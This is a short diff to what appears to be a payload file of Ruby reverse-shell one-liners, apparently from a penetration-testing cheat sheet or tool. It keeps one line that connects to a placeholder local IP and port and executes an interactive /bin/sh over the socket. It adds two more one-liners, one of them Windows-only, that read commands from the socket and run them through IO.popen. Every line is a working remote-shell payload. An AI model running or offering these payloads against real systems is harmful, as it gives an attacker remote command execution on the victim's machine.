@@ -1,1 +1,6 @@
 ruby -rsocket -e'f=TCPSocket.open("$local_ip",$port).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+
+ruby -rsocket -e 'exit if fork;c=TCPSocket.new("$local_ip","$port");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+
+# Windows only
+ruby -rsocket -e 'c=TCPSocket.new("$local_ip","$port");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
